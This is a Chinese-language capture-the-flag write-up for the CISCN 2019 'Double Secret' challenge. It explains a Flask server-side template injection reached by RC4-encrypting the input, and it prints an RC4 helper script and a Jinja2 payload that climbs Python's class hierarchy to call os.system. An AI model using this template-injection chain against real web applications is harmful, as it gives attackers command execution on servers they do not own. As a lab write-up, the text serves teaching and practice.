#SSTI
存在 /secret 目录

传参 secret 在 报错页面有部分 app.py 代码

```python
    if(secret==None):
        return 'Tell me your secret.I will encrypt it so others can\'t see'
    rc=rc4_Modified.RC4("HereIsTreasure")   #解密
    deS=rc.do_crypt(secret)

    a=render_template_string(safe(deS))

    if 'ciscn' in a.lower():
        return 'flag detected!'
    return a
```

RC4 是一种加密算法，对称加密，对明文加密一次得到密文，对密文加密一次又会得到明文
如果我们输入密文，则返回的是明文

```python
# RC4是一种对称加密算法，那么对密文进行再次加密就可以得到原来的明文

import base64
from urllib.parse import quote


def rc4_main(key="init_key", message="init_message"):
    # print("RC4加密主函数")
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return crypt


def rc4_init_sbox(key):
    s_box = list(range(256))  # 我这里没管秘钥小于256的情况，小于256不断重复填充即可
    # print("原来的 s 盒：%s" % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print("混乱后的 s 盒：%s"% s_box)
    return s_box


def rc4_excrypt(plain, box):
    # print("调用加密程序成功。")
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    # print("res用于加密字符串，加密后是：%res" %res)
    cipher = "".join(res)
    print("加密后的字符串是：%s" % quote(cipher))
    # print("加密后的输出(经过编码):")
    # print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
    return str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')


rc4_main("key", "text")


```

之后利用模板注入，将 payload 加密后传入

利用 os

```python
''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')
```

参考
[[CISCN 2019 华东南]Double Secret_ph0ebus 的博客-CSDN 博客](https://blog.csdn.net/qq_46266259/article/details/128920290)
